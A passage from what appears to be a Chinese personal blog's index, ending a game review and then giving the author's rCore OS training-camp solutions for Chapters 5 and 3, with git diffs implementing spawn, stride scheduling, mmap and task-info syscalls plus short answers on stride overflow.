那样的纯文字冒险游戏，即便它们中很多都有跌宕起伏的故事情节，但完全没有可操作部分也让我很难只为了故事本身而完成游戏流程。而像《龙脉常歌》这样的游戏模式我却很喜欢，本作也存在一些诸如模拟经营和解谜的玩法，但都设计的非常轻度，属于是故事情节与情节之间衔接的过渡元素，能够很好的调节游戏节奏。飞船虽然也有油量和耐久度的限定，但都在制作组的掌控之中，实际上只要按正常流程走基本不会出现数值见底的情况，这个限制的加入更多是为了营造星际航行时的紧张感，而非给玩家出的难题。gameplay 缺乏挑战和负担也可以让玩家更加专注于游戏所要传达的故事本身，而不至于因此分散了注意力，这也是前作《灵魂之桥》我觉得做得不够好的地方，“雪地探索捡垃圾”的玩法对于这类叙事游戏来说还是稍显繁琐。\n本作我其实已经加入 steam 心愿单已久，却没想直接加入 xgp 了。通关了 xgp 的版本之后，出于对本作的喜爱，我又赶在 ns 版本打折的时候又买了一份，也算是对制作组的支持，希望它们的下一部作品能够做得更好。\n","categories":["游戏"],"tags":["游戏","闲谈"]},{"title":"2024开源操作系统训练营 rCore Chapter5练习","url":"/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/","content":"编程作业思路进程创建如果只是想根据特定程序来创建进程，而不需要 fork + exec 组合提供的灵活性（如文件重定位等），那么 spawn 将是一个更简洁且效率更高的选择，本实验要求便是实现它。\n对于 spawn 的实现，确实可以简单地将 fork 和 exec 拼接起来。但需要注意的是，fork 首先拷贝父进程的地址空间，exec 再将该地址空间替换，二者融合后最开始地址空间的拷贝其实是徒劳的。如以下代码所示：\nlet memory_set = MemorySet::from_existed_user(&amp;parent_inner.memory_set);  // futile code!...let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);\nstride 调度算法实现一个简单的步长调度算法，由于算法思路比较简单，这里直接介绍实现方式。\n首先，为了保存进程的“步长”和优先级信息，需要为进程控制块添加两个字段 stride 和 prio（不考虑性能，为了实现的简单，pass 字段省略，而是在每次增加步长时再计算）。\n在进行调度时（TaskManager.fetch()），需要从进程就绪队列中找到 stride 最小的进程进行调度，并为其 stride 加上对应的 pass，pass 的计算方式是用预先设定的大常数 BigStride 除以进程优先级 prio 得到。这里如果为了效率考虑，就绪队列可以采用优先队列的数据结构，而为了实现的简单，这里选择一次遍历的方式寻找最小值。\n最后，在一个时间片后，重新调度当前 stride 最小的进程。这一时间片轮转策略已经事先实现好，不需要做修改，实现代码如下所示：\n// os/src/task/mod.rspub fn trap_handler() -&gt; ! &#123;...        Trap::Interrupt(Interrupt::SupervisorTimer) =&gt; &#123;            set_next_trigger();            suspend_current_and_run_next();        &#125;...&#125;\nCPU 每个时钟周期都发起一次时钟中断进入内核，内核的 trap_handler 检测到陷入原因是时钟中断，则调用 suspend_current_and_run_next 将当前进程放入就绪队列中，并重新进行调度。\n前向兼容从本实验开始，内核必须前向兼容，能够通过前一章的所有测试用例。根据文档提示，可以采用 git cherry-pick 系列命令，将其他分支的 commit 移植到本章分支。使用方法如下：\n\n合并特定的 commit 到当前分支：git cherry-pick &lt;commit id&gt;。\n若遇到冲突，首先打开冲突文件，如：os/src/syscall/process.rs，编辑文件，解决冲突。\n冲突解决后，标记已解决冲突的文件：git add os/src/syscall/process.rs。重复 2、3 步骤，直至解决完所有的冲突。\n继续 cherry-pick 过程：git cherry-pick --continue。\n\n这一章由于涉及到任务到进程的转变，框架改动较大，且前面章节修改的代码也不算多，因此我最终还是选择了手动移植。但在后面章节的实验中还是建议使用 cherry-pick.\n代码diff --git a/os/src/config.rs b/os/src/config.rsindex 5761cdd..b836e56 100644--- a/os/src/config.rs+++ b/os/src/config.rs@@ -23,3 +23,5 @@ pub const TRAP_CONTEXT_BASE: usize = TRAMPOLINE - PAGE_SIZE; pub const CLOCK_FREQ: usize = 12500000; /// the physical memory end pub const MEMORY_END: usize = 0x88000000;+/// big constant for process scheduling+pub const BIG_STRIDE: isize = 1000_000;\\ No newline at end of filediff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644--- a/os/src/mm/frame_allocator.rs+++ b/os/src/mm/frame_allocator.rs@@ -1,7 +1,7 @@ //! Implementation of [`FrameAllocator`] which //! controls all the frames in the operating system. use super::&#123;PhysAddr, PhysPageNum&#125;;-use crate::config::MEMORY_END;+use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;; use crate::sync::UPSafeCell; use alloc::vec::Vec; use core::fmt::&#123;self, Debug, Formatter&#125;;@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;     drop(v);     println!(&quot;frame_allocator_test passed!&quot;); &#125;++/// Check if the remaining physical memory is sufficient+pub fn is_mem_sufficient(_len: usize) -&gt; bool &#123;+    let fa = FRAME_ALLOCATOR.exclusive_access();+    let page_cnt = fa.end - fa.current + fa.recycled.len();+    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt+&#125;diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex c3d15f3..dca8551 100644--- a/os/src/mm/memory_set.rs+++ b/os/src/mm/memory_set.rs@@ -60,6 +60,19 @@ impl MemorySet &#123;             None,         );     &#125;+    /// Remove framed area+    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;+        let mut idx = 0;+        for area in self.areas.iter_mut() &#123;+            if area.vpn_range.get_start().0 == range.get_start().0 +                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;+                area.unmap(&amp;mut self.page_table);+                break;+            &#125;+            idx += 1;+        &#125;+        self.areas.remove(idx);+    &#125;     /// remove a area     pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;         if let Some((idx, area)) = selfdiff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d216861..8ff9c7b 100644--- a/os/src/mm/mod.rs+++ b/os/src/mm/mod.rs@@ -11,9 +11,9 @@ mod heap_allocator; mod memory_set; mod page_table; -pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;-use address::&#123;StepByOne, VPNRange&#125;;-pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;+pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;+use address::StepByOne;+pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;; pub use memory_set::remap_test; pub use memory_set::&#123;MapPermission, MemorySet, KERNEL_SPACE&#125;; pub use page_table::&#123;translated_byte_buffer, translated_refmut, translated_str, PageTableEntry&#125;;diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 8e0a7dd..ba663a1 100644--- a/os/src/syscall/mod.rs+++ b/os/src/syscall/mod.rs@@ -45,8 +45,11 @@ mod process;  use fs::*; use process::*;++use crate::task::current_task; /// handle syscall exception with `syscall_id` and other arguments pub fn syscall(syscall_id: usize, args: [usize; 3]) -&gt; isize &#123;+    current_task().unwrap().inc_syscall_times(syscall_id);     match syscall_id &#123;         SYSCALL_READ =&gt; sys_read(args[0], args[1] as *const u8, args[2]),         SYSCALL_WRITE =&gt; sys_write(args[0], args[1] as *const u8, args[2]),diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f7aa9c3..13b9abb 100644--- a/os/src/syscall/process.rs+++ b/os/src/syscall/process.rs@@ -1,14 +1,16 @@ //! Process management syscalls++use core::mem::size_of;+ use alloc::sync::Arc;  use crate::&#123;     config::MAX_SYSCALL_NUM,     loader::get_app_data_by_name,-    mm::&#123;translated_refmut, translated_str&#125;,+    mm::&#123;is_mem_sufficient, translated_byte_buffer, translated_refmut, translated_str, VirtAddr&#125;,     task::&#123;-        add_task, current_task, current_user_token, exit_current_and_run_next,-        suspend_current_and_run_next, TaskStatus,-    &#125;,+        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus+    &#125;, timer::get_time_us, &#125;;  #[repr(C)]@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -&gt; isize &#123; /// HINT: What if [`TimeVal`] is splitted by two pages ? pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_get_time&quot;,         current_task().unwrap().pid.0     );-    -1+    let _us = get_time_us();+    let time_val = TimeVal &#123;+        sec: _us / 1_000_000,+        usec: _us % 1_000_000,+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal&gt;());+    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            time_val_ptr = time_val_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// YOUR JOB: Finish sys_task_info to pass testcases@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123; /// HINT: What if [`TaskInfo`] is splitted by two pages ? pub fn sys_task_info(_ti: *mut TaskInfo) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_task_info&quot;,         current_task().unwrap().pid.0     );-    -1+    let task_info = TaskInfo &#123;+        status: TaskStatus::Running,+        syscall_times: current_task().unwrap().get_syscall_times(),+        time: current_task().unwrap().get_scheduled_timespan(),+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo&gt;());+    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            task_info_ptr = task_info_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// YOUR JOB: Implement mmap. pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_mmap&quot;,         current_task().unwrap().pid.0     );-    -1+    let start_va = VirtAddr::from(_start);+    // 1. illegal start virtual address or port+    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;+        return -1;+    &#125;++    // 2. Check is there sufficient physical memory+    if !is_mem_sufficient(_len) &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(_start + _len);+    current_task().unwrap().mmap(start_va, end_va, _port) &#125;  /// YOUR JOB: Implement munmap. pub fn sys_munmap(_start: usize, _len: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_munmap&quot;,         current_task().unwrap().pid.0     );-    -1+    let start_va = VirtAddr::from(_start);+    if !start_va.aligned() &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(_start + _len);+    current_task().unwrap().munmap(start_va, end_va) &#125;  /// change data segment size@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -&gt; isize &#123; /// HINT: fork + exec =/= spawn pub fn sys_spawn(_path: *const u8) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_spawn&quot;,         current_task().unwrap().pid.0     );-    -1+    +    // spawn a new process based upon _path+    let token = current_user_token();+    let _path = translated_str(token, _path);+    let data_opt = get_app_data_by_name(_path.as_str());+    if data_opt.is_none() &#123;  // invalid file name+        return -1;+    &#125;+    let current_task = current_task().unwrap();+    let new_task = current_task.spawn(data_opt.unwrap());+    let new_pid = new_task.getpid();+    add_task(new_task);+    new_pid as isize &#125;  // YOUR JOB: Set task priority. pub fn sys_set_priority(_prio: isize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_set_priority&quot;,         current_task().unwrap().pid.0     );-    -1+    if _prio &lt;= 1 &#123;+        return -1;+    &#125;+    let current_task = current_task().unwrap();+    current_task.set_prio(_prio);+    _prio &#125;diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644--- a/os/src/task/manager.rs+++ b/os/src/task/manager.rs@@ -19,11 +19,27 @@ impl TaskManager &#123;     &#125;     /// Add process back to ready queue     pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock&gt;) &#123;+        task.inc_stride();         self.ready_queue.push_back(task);     &#125;     /// Take a process out of the ready queue     pub fn fetch(&amp;mut self) -&gt; Option&lt;Arc&lt;TaskControlBlock&gt;&gt; &#123;-        self.ready_queue.pop_front()+        // self.ready_queue.pop_front()+        let mut min_stride = isize::MAX;+        let mut best_idx = 0;+        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;+            let stride = tcb.get_stride();+            if min_stride &gt; stride &#123;+                min_stride = stride;+                best_idx = idx;+            &#125;+        &#125;+        if min_stride == isize::MAX &#123;+            None+        &#125; else &#123;+            self.ready_queue.swap(0, best_idx);+            self.ready_queue.pop_front()+        &#125;     &#125; &#125; diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644--- a/os/src/task/processor.rs+++ b/os/src/task/processor.rs@@ -8,6 +8,7 @@ use super::__switch; use super::&#123;fetch_task, TaskStatus&#125;; use super::&#123;TaskContext, TaskControlBlock&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use crate::trap::TrapContext; use alloc::sync::Arc; use lazy_static::*;@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;             let mut task_inner = task.inner_exclusive_access();             let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;             task_inner.task_status = TaskStatus::Running;+            // if the task is being called for the first time,+            if task_inner.time == 0usize &#123;+                // then set it to the current time+                task_inner.time = get_time_ms();+            &#125;             // release coming task_inner manually             drop(task_inner);             // release coming task TCB manuallydiff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 1402c31..e60021d 100644--- a/os/src/task/task.rs+++ b/os/src/task/task.rs@@ -1,9 +1,10 @@ //! Types related to task management &amp; Functions for completely changing TCB use super::TaskContext; use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;-use crate::config::TRAP_CONTEXT_BASE;-use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;+use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;+use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use crate::trap::&#123;trap_handler, TrapContext&#125;; use alloc::sync::&#123;Arc, Weak&#125;; use alloc::vec::Vec;@@ -34,6 +35,86 @@ impl TaskControlBlock &#123;         let inner = self.inner_exclusive_access();         inner.memory_set.token()     &#125;+    /// Set the schduling priority+    pub fn set_prio(&amp;self, prio: isize) &#123;+        let mut inner = self.inner_exclusive_access();+        inner.set_prio(prio);+    &#125;+    /// Get the schduling stride+    pub fn get_stride(&amp;self) -&gt; isize &#123;+        let inner = self.inner_exclusive_access();+        inner.stride+    &#125;+    /// Increase the stride by pass+    pub fn inc_stride(&amp;self) &#123;+        let mut inner = self.inner_exclusive_access();+        inner.inc_stride();+    &#125;+    /// Get syscall times+    pub fn get_syscall_times(&amp;self) -&gt; [u32; MAX_SYSCALL_NUM] &#123;+        let inner = self.inner.exclusive_access();+        inner.syscall_times.clone()+    &#125;+    /// Get time span between current time and first scheduled time+    pub fn get_scheduled_timespan(&amp;self) -&gt; usize &#123;+        let inner = self.inner.exclusive_access();+        get_time_ms() - inner.time+    &#125;+    /// Increase syscall times+    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -&gt; bool &#123;+        if syscall_id &gt;= MAX_SYSCALL_NUM &#123;+            return false;+        &#125;+        let mut inner = self.inner.exclusive_access();+        inner.syscall_times[syscall_id] += 1;+        true+    &#125;+    /// Map some pages to memory_set+    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil()+        );+        +        // 3. Check if trying to map mapped page+        for vpn in vpn_range &#123;+            if let Some(pte) = inner.memory_set.translate(vpn) &#123;+                if pte.is_valid() &#123;+                    return -1;+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // push a new map_area to current memory_set+        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;+        inner.memory_set.insert_framed_area(start_va, end_va, perm);+        0+    &#125;++    /// Unmap some pages in memory set+    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil(),+        );++        // 1. Check if trying to unmap unmapped page+        for vpn in vpn_range &#123;+            if let Some(pte) = inner.memory_set.translate(vpn) &#123;+                if !pte.is_valid() &#123;+                    return -1+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // remove some pages from current memory_set+        inner.memory_set.remove_framed_area(vpn_range);+        0+    &#125; &#125;  pub struct TaskControlBlockInner &#123;@@ -68,6 +149,18 @@ pub struct TaskControlBlockInner &#123;      /// Program break     pub program_brk: usize,++    /// Scheduling priority+    pub prio: isize,++    /// Scheduling stride+    pub stride: isize,++    /// The syscall times+    pub syscall_times: [u32; MAX_SYSCALL_NUM],++    /// The first time the task was scheduled+    pub time: usize, &#125;  impl TaskControlBlockInner &#123;@@ -85,6 +178,13 @@ impl TaskControlBlockInner &#123;     pub fn is_zombie(&amp;self) -&gt; bool &#123;         self.get_status() == TaskStatus::Zombie     &#125;+    pub fn set_prio(&amp;mut self, prio: isize) &#123;+        self.prio = prio;+    &#125;+    pub fn inc_stride(&amp;mut self) &#123;+        let pass = BIG_STRIDE / self.prio;+        self.stride += pass;+    &#125; &#125;  impl TaskControlBlock &#123;@@ -118,6 +218,10 @@ impl TaskControlBlock &#123;                     exit_code: 0,                     heap_bottom: user_sp,                     program_brk: user_sp,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,                 &#125;)             &#125;,         &#125;;@@ -191,6 +295,10 @@ impl TaskControlBlock &#123;                     exit_code: 0,                     heap_bottom: parent_inner.heap_bottom,                     program_brk: parent_inner.program_brk,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,                 &#125;)             &#125;,         &#125;);@@ -206,6 +314,55 @@ impl TaskControlBlock &#123;         // ---- release parent PCB     &#125; +    /// parent process spawn the child process+    pub fn spawn(self: &amp;Arc&lt;Self&gt;, elf_data: &amp;[u8]) -&gt; Arc&lt;Self&gt; &#123;+        let mut parent_inner = self.inner_exclusive_access();+        // create a user space based upon elf_data+        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);+        let trap_cx_ppn = memory_set+            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())+            .unwrap()+            .ppn();+        // alloc a pid and a kernel stack in kernel space+        let pid_handle = pid_alloc();+        let kernel_stack = kstack_alloc();+        let kernel_stack_top = kernel_stack.get_top();+        let task_control_block = Arc::new(TaskControlBlock &#123;+            pid: pid_handle,+            kernel_stack,+            inner: unsafe &#123;+                UPSafeCell::new(TaskControlBlockInner &#123;+                    trap_cx_ppn,+                    base_size: user_sp,+                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),+                    task_status: TaskStatus::Ready,+                    memory_set,+                    parent: Some(Arc::downgrade(self)),+                    children: Vec::new(),+                    exit_code: 0,+                    heap_bottom: parent_inner.heap_bottom,+                    program_brk: parent_inner.program_brk,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,+                &#125;)+            &#125;,+        &#125;);+        // add child+        parent_inner.children.push(task_control_block.clone());+        // modify trap_cx+        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();+        *trap_cx = TrapContext::app_init_context(+            entry_point,+            user_sp,+            KERNEL_SPACE.exclusive_access().token(),+            kernel_stack_top,+            trap_handler as usize,+        );+        task_control_block+    &#125;+     /// get pid of process     pub fn getpid(&amp;self) -&gt; usize &#123;         self.pid.0\n问答作业stride 算法原理非常简单，但是有一个比较大的问题。例如两个 pass = 10 的进程，使用 8bit 无符号整型储存 stride， p1.stride = 255, p2.stride = 250，在 p2 执行一个时间片后，理论上下一次应该 p1 执行。\nQ1: 实际情况是轮到 p1 执行吗？为什么？ \nA1: 不是，对于 8 位无符号整型而言，它能够表示的最大整数为 255，因此当 p2 执行了一个时间片后，p2.stride = p2.stride + pass = 250 + 10 = 4 (overflow!) 。这样，下一次被调度的进程实际上还是 p2.\n我们之前要求进程优先级 &gt;= 2 其实就是为了解决这个问题。可以证明，在不考虑溢出的情况下, 在进程优先级全部 &gt;= 2 的情况下，如果严格按照算法执行，那么 STRIDE_MAX – STRIDE_MIN &lt;= BigStride / 2.\nQ2: 为什么？尝试简单说明（不要求严格证明）。\nA2: 进程优先级 &gt;= 2，则有 pass &lt;= BigStride / 2，由于调度策略的影响，最大步长与最小步长的差值最大不超过 pass，那么便有 STRIDE_MAX – STRIDE_MIN &lt;= pass &lt;= BigStride / 2.\nQ3: 已知以上结论，考虑溢出的情况下，可以为 Stride 设计特别的比较器，让 BinaryHeap&lt;Stride&gt; 的 pop 方法能返回真正最小的 Stride。补全下列代码中的 partial_cmp 函数，假设两个 Stride 永远不会相等。\nuse core::cmp::Ordering;struct Stride(u64);impl PartialOrd for Stride &#123;    fn partial_cmp(&amp;self, other: &amp;Self) -&gt; Option&lt;Ordering&gt; &#123;        // ...    &#125;&#125;impl PartialEq for Stride &#123;    fn eq(&amp;self, other: &amp;Self) -&gt; bool &#123;        false    &#125;&#125;\n\n TIPS: 使用 8 bits 存储 stride, BigStride = 255, 则: (125 &lt; 255) == false, (129 &lt; 255) == true.\n\nA3: \nuse core::cmp::Ordering;struct Stride(u64);impl PartialOrd for Stride &#123;    fn partial_cmp(&amp;self, other: &amp;Self) -&gt; Option&lt;Ordering&gt; &#123;        let half = BigStride / 2;    \tif self.0 &lt; other.0 &#123;            if other.0 - self.0 &lt;= half &#123;                Some(Ordering::Less)            &#125; else &#123;                Some(Ordering::Greater)            &#125;        &#125; else &#123;            if self.0 - other.0 &lt;= half &#123;                Some(Ordering::Greater)            &#125; else &#123;                Some(Ordering::Less)            &#125;        &#125;    &#125;&#125;impl PartialEq for Stride &#123;    fn eq(&amp;self, other: &amp;Self) -&gt; bool &#123;        false    &#125;&#125;\n","categories":["操作系统"],"tags":["Rust","操作系统","经验"]},{"title":"2024开源操作系统训练营 rCore Chapter3练习","url":"/2024/10/28/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter3%E7%BB%83%E4%B9%A0/","content":"编程作业思路rCore 的第一个实验，主要是为了熟悉如何进行内核编程，实现起来比较简单。\n要求实现一个系统调用，填充传入的 TaskInfo 结构体已获取当前任务的一些信息，包含三个字段：任务状态、任务使用的系统调用及调用次数、系统调用时刻距离任务第一次被调度时刻的时长（单位 ms）。\n首先是任务状态，这个比较简单，直接查看当前任务的任务控制块的字段值即可。\n对于系统调用次数，可以在任务控制块中添加新的字段来存储相关信息，例如按提示所说，一个长度为 MAX_SYSCALL_NUM 的整型数组。在函数 syscall/mod.rs:syscall 中，在内核对用户态传入的系统调用号进行分发处理前，增加对应的系统调用桶的计数。注意，由于本次系统调用 sys_task_info 也要进行计数，因此不能在执行了特定的系统调用后再来增加计数，否则本次 sys_task_info 系统调用次数将无法被统计。\n最后是距离任务第一次被调度时刻的时长，一种实现方式是：为任务控制块添加新的字段：time，表示任务第一次被调度的时间。先为 time 设定一个初始值（例如 0），表示该值未被更改过，每当一个任务即将被调度时（如 TASK_MANAGER.run_next_task() 进行任务切换时），查看 time 值，判断是否未被更改：如果是，则赋予当前时间；否则，不做任何操作。这样，就成功保存了任务初次被调度的时刻。在调用 sys_task_info 时，将当前时间减去保存的初次被调度时间，即为时长，注意单位为毫秒。\n代码由于代码是直接在原项目代码的基础上进行修改，因此为了查看方便，本次及之后实验的代码将以 git diff 的形式展现，加号（绿色）代表添加的代码，减号（红色）代表删除的代码。\ndiff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex e6e8f98..7f63ed6 100644--- a/os/src/syscall/mod.rs+++ b/os/src/syscall/mod.rs@@ -26,8 +26,13 @@ mod process;  use fs::*; use process::*;++use crate::task::inc_syscall_times;+ /// handle syscall exception with `syscall_id` and other arguments pub fn syscall(syscall_id: usize, args: [usize; 3]) -&gt; isize &#123;+    // increase syscall times before handle specific syscall+    inc_syscall_times(syscall_id);     match syscall_id &#123;         SYSCALL_WRITE =&gt; sys_write(args[0], args[1] as *const u8, args[2]),         SYSCALL_EXIT =&gt; sys_exit(args[0] as i32),diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f1cd424..8d01cf4 100644--- a/os/src/syscall/process.rs+++ b/os/src/syscall/process.rs@@ -1,8 +1,9 @@ //! Process management syscalls+ use crate::&#123;     config::MAX_SYSCALL_NUM,-    task::&#123;exit_current_and_run_next, suspend_current_and_run_next, TaskStatus&#125;,-    timer::get_time_us,+    task::&#123;exit_current_and_run_next, get_current_tcb, suspend_current_and_run_next, TaskStatus&#125;,+    timer::&#123;get_time_ms, get_time_us&#125;, &#125;;  #[repr(C)]@@ -53,5 +54,19 @@ pub fn sys_get_time(ts: *mut TimeVal, _tz: usize) -&gt; isize &#123; /// YOUR JOB: Finish sys_task_info to pass testcases pub fn sys_task_info(_ti: *mut TaskInfo) -&gt; isize &#123;     trace!(&quot;kernel: sys_task_info&quot;);-    -1+    let cur_tcb = get_current_tcb();+    // labour in vain! The status must be Running+    let status = cur_tcb.task_status;+    let syscall_times = cur_tcb.syscall_times;+    let time = get_time_ms() - cur_tcb.time;++    unsafe &#123;+        *_ti = TaskInfo &#123;+            status,+            syscall_times,+            time,+        &#125;+    &#125;++    0 &#125;diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex c1636ef..4a14e2f 100644--- a/os/src/task/mod.rs+++ b/os/src/task/mod.rs@@ -14,9 +14,11 @@ mod switch; #[allow(clippy::module_inception)] mod task; -use crate::config::MAX_APP_NUM;++use crate::config::&#123;MAX_APP_NUM, MAX_SYSCALL_NUM&#125;; use crate::loader::&#123;get_num_app, init_app_cx&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use lazy_static::*; use switch::__switch; pub use task::&#123;TaskControlBlock, TaskStatus&#125;;@@ -54,6 +56,8 @@ lazy_static! &#123;         let mut tasks = [TaskControlBlock &#123;             task_cx: TaskContext::zero_init(),             task_status: TaskStatus::UnInit,+            syscall_times: [0u32; MAX_SYSCALL_NUM],+            time: 0usize,         &#125;; MAX_APP_NUM];         for (i, task) in tasks.iter_mut().enumerate() &#123;             task.task_cx = TaskContext::goto_restore(init_app_cx(i));@@ -122,6 +126,11 @@ impl TaskManager &#123;             let mut inner = self.inner.exclusive_access();             let current = inner.current_task;             inner.tasks[next].task_status = TaskStatus::Running;+            // if the task is being called for the first time,+            if inner.tasks[next].time == 0usize &#123;+                // then set it to the current time+                inner.tasks[next].time = get_time_ms();+            &#125;             inner.current_task = next;             let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;             let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;@@ -135,6 +144,24 @@ impl TaskManager &#123;             panic!(&quot;All applications completed!&quot;);         &#125;     &#125;++    /// Get task control block+    pub fn get_current_tcb(&amp;self) -&gt; TaskControlBlock &#123;+        let inner = self.inner.exclusive_access();+        let current = inner.current_task;+        inner.tasks[current].clone()+    &#125;++    /// increase syscall times+    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -&gt; bool &#123;+        if syscall_id &gt;= MAX_SYSCALL_NUM &#123;+            return false;+        &#125;+        let mut inner = self.inner.exclusive_access();+        let current = inner.current_task;+        inner.tasks[current].syscall_times[syscall_id] += 1;+        true+    &#125; &#125;  /// Run the first task in task list.@@ -169,3 +196,13 @@ pub fn exit_current_and_run_next() &#123;     mark_current_exited();     run_next_task(); &#125;++/// Get current task control block+pub fn get_current_tcb() -&gt; TaskControlBlock &#123;+    TASK_MANAGER.get_current_tcb()+&#125;++/// increase syscall times+pub fn inc_syscall_times(syscall_id: usize) -&gt; bool &#123;+    TASK_MANAGER.inc_syscall_times(syscall_id)+&#125;\\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex e6580c9..4e4c19b 100644--- a/os/src/task/task.rs+++ b/os/src/task/task.rs@@ -1,6 +1,7 @@ //! Types related to task management  use super::TaskContext;+use crate::config::MAX_SYSCALL_NUM;  /// The task control block (TCB) of a task. #[derive(Copy, Clone)]@@ -9,6 +10,10 @@ pub struct TaskControlBlock &#123;     pub task_status: TaskStatus,     /// The task context     pub task_cx: TaskContext,+    /// The syscall times+    pub syscall_times: [u32; MAX_SYSCALL_NUM],+    /// The first time the task was scheduled+    pub 